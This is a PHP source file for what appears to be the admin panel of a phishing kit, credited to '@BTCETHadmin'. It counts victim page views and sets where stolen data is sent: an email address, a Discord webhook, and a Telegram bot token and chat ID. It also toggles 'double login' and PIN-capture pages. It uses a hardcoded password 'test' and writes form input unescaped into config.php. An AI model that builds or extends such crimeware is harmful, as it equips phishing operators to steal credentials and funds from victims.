<?php
// Get the current time
$current_time = date('Y-m-d');



// Define the password for access
$password = "test";

// Path to the log file
$log_file = 'logs.txt';

// Function to count views
function count_views($log_file) {
    // Check if the log file exists
    if (!file_exists($log_file)) {
        return 0; // Return 0 if the file doesn't exist
    }
    
    // Count the number of lines in the log file
    $lines = file($log_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return count($lines);
}

// Get the total views
$total_views = count_views($log_file);

// Start a session to handle authentication
session_start();

// Handle logout request
if (isset($_GET['logout'])) {
    session_destroy(); // Destroy the session
    header("Location: index.php"); // Redirect to the login page
    exit;
}

// Check if the user is already authenticated
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    // Check if the password is submitted
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if ($_POST['password'] === $password) {
            $_SESSION['authenticated'] = true; // Mark as authenticated
        } else {
            $error = "Invalid password. Please try again.";
        }
    }

    // If not authenticated, show the login form
    if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Login</title>
            <!-- Bootstrap CSS -->
            <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
        </head>

        <style>
         @font-face {
   font-family: font;
   src: url(font.woff);
}
</style>
        <body class="bg-light" style="font-family: font;">
            <div class="container mt-5">
                <div class="row justify-content-center">
                    <div class="col-md-4">
                        <div class="card shadow">
                            <div class="card-body">
                                <h3 class="text-center">ADMIN PANEL</h3>
                                <h4> PAGE BY @BTCETHadmin </h4>
                                <form method="POST">
                                    <div class="mb-3">
                                        <label for="password" class="form-label">Password</label>
                                        <input type="password" class="form-control" id="password" name="password" required>
                                    </div>
                                    <?php if (isset($error)) { ?>
                                        <div class="alert alert-danger text-center"><?php echo $error; ?></div>
                                    <?php } ?>
                                    <div class="d-grid">
                                        <button type="submit" class="btn btn-primary">Login</button>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </body>
        </html>
        <?php
        exit; // Prevent further execution if not authenticated
    }
}

// Config file path
$config_file = 'config.php';



// Read the existing config.php file
$config_contents = file_get_contents($config_file);

// Extract existing values using regex
preg_match('/\$email\s*=\s*"(.*?)"/', $config_contents, $email_match);
preg_match('/\$discord_webhook\s*=\s*"(.*?)"/', $config_contents, $discord_webhook_match);
preg_match('/\$telegram_bot_api\s*=\s*"(.*?)"/', $config_contents, $telegram_bot_api_match);
preg_match('/\$telegram_chat_id\s*=\s*"(.*?)"/', $config_contents, $telegram_chat_id_match);
preg_match('/\$expiry_time\s*=\s*"(.*?)"/', $config_contents, $expiry_time_match);
preg_match('/define\(\s*\'double_login\',\s*\'(.*?)\'\s*\)/', $config_contents, $double_login_match);
preg_match('/define\(\s*\'pin_page\',\s*\'(.*?)\'\s*\)/', $config_contents, $pin_page_match);

// Set existing values or default to empty
$email = $email_match[1] ?? '';
$discord_webhook = $discord_webhook_match[1] ?? '';
$telegram_bot_api = $telegram_bot_api_match[1] ?? '';
$telegram_chat_id = $telegram_chat_id_match[1] ?? '';
$expiry_time = $expiry_time_match[1] ?? '';
$double_login = $double_login_match[1] ?? 'off';
$pin_page = $pin_page_match[1] ?? 'off';

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email'])) {
    // Get new values from the form
    $new_email = $_POST['email'] ?? $email;
    $new_discord_webhook = $_POST['discord_webhook'] ?? $discord_webhook;
    $new_telegram_bot_api = $_POST['telegram_bot_api'] ?? $telegram_bot_api;
    $new_telegram_chat_id = $_POST['telegram_chat_id'] ?? $telegram_chat_id;
    $new_expiry_time = $_POST['expiry_time'] ?? $expiry_time;
    $new_double_login = isset($_POST['double_login']) ? 'on' : 'off';
    $new_pin_page = isset($_POST['pin_page']) ? 'on' : 'off';

    // Update only the modified fields in the config file
    $config_contents = preg_replace('/\$email\s*=\s*".*?"/', "\$email = \"$new_email\"", $config_contents);
    $config_contents = preg_replace('/\$discord_webhook\s*=\s*".*?"/', "\$discord_webhook = \"$new_discord_webhook\"", $config_contents);
    $config_contents = preg_replace('/\$telegram_bot_api\s*=\s*".*?"/', "\$telegram_bot_api = \"$new_telegram_bot_api\"", $config_contents);
    $config_contents = preg_replace('/\$telegram_chat_id\s*=\s*".*?"/', "\$telegram_chat_id = \"$new_telegram_chat_id\"", $config_contents);   
     $config_contents = preg_replace('/\$expiry_time\s*=\s*".*?"/', "\$expiry_time = \"$new_expiry_time\"", $config_contents);
    $config_contents = preg_replace('/define\(\s*\'double_login\',\s*\'(.*?)\'\s*\)/', "define('double_login', '$new_double_login')", $config_contents);
 $config_contents = preg_replace('/define\(\s*\'pin_page\',\s*\'(.*?)\'\s*\)/', "define('pin_page', '$new_pin_page')", $config_contents);

    // Save updated content back to the file
    file_put_contents($config_file, $config_contents);

    echo "<div class='alert alert-success text-center'>Config updated successfully!</div>";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="refresh" content="25; url=index.php">

    <title>Edit Config</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-light">
    <div class="container mt-5">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <div class="card shadow">
                    <div class="card-body">
                        <h3 class="text-center">Edit Config</h3>

                                                <h2 class="display-4 text-primary">Total Views : <?php echo $total_views; ?></h2>
                                                <span> Page refreshes every 25 seconds to update view count.</span> <br>
                                                <span> After Updating details refresh page to make sure all details are uploaded</span> 


                      


                        <form method="POST">
                            <div class="mb-3">
                                <label for="email" class="form-label">Email</label>
                                <input type="text" class="form-control" id="email" name="email" value="<?php echo htmlspecialchars($email); ?>">
                            </div>
                            <div class="mb-3">
                                <label for="discord_webhook" class="form-label">Discord Webhook</label>
                                <input type="text" class="form-control" id="discord_webhook" name="discord_webhook" value="<?php echo htmlspecialchars($discord_webhook); ?>">
                            </div>
                            <div class="mb-3">
                                <label for="telegram_bot_api" class="form-label">Telegram Bot Token</label>
                                <input type="text" class="form-control" id="telegram_bot_api" name="telegram_bot_api" value="<?php echo htmlspecialchars($telegram_bot_api); ?>">
                            </div>
                            <div class="mb-3">
                                <label for="telegram_chat_id" class="form-label">Telegram Chat ID</label>
                                <input type="text" class="form-control" id="telegram_chat_id" name="telegram_chat_id" value="<?php echo htmlspecialchars($telegram_chat_id); ?>">
                            </div>
                            <p class="text-muted">Current Time: <strong><?php echo $current_time; ?></strong></p>
                              <p class="text-muted">This page will expire on: <strong><?php echo $expiry_time; ?></strong></p>

                            <div class="mb-3">
                                <label for="expiry_date" class="form-label">Set Expiration Date</label>
                                <input type="date" class="form-control datepicker" id="expiry_time" name="expiry_time" placeholder="YYYY-MM-DD" required>
                            </div>

                            <div class="mb-3 form-check">
                                <input type="checkbox" class="form-check-input" id="double_login" name="double_login" <?php echo $double_login === 'on' ? 'checked' : ''; ?>>
                                <label for="double_login" class="form-check-label">Enable Double Login</label>
                            </div>
                            <label>DOUBLE LOGIN STATUS : <?php echo htmlspecialchars($double_login); ?> </label>
                            <br>
                            <!-- <div class="mb-3 form-check">
                                <input type="checkbox" class="form-check-input" id="pin_page" name="pin_page" <?php echo $pin_page === 'on' ? 'checked' : ''; ?>>
                                <label for="pin_page" class="form-check-label">Enable PIN PAGE</label>
                            </div>
                            <label>PIN PAGE STATUS : <?php echo htmlspecialchars($pin_page); ?> </label> 
 -->
                            <div class="d-grid">
                                <button type="submit" class="btn btn-primary">Save</button>
                            </div>
                            

                        </form>
                        <script>
        // Initialize the date picker
        $(document).ready(function () {
            $('.datepicker').datepicker({
                format: 'yyyy-mm-dd',
                autoclose: true,
                todayHighlight: true
            });
        });
    </script>

                        <br>
                        <form method="GET">
                            <div class="d-grid">
                                <button type="submit" name="logout" class="btn btn-danger">Logout</button>
                            </div>
                        </form>
<br>
                         <div class="d-grid">
                               
<a href="index.php" class="btn btn-danger">REFRESH</a>
                            </div>

                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
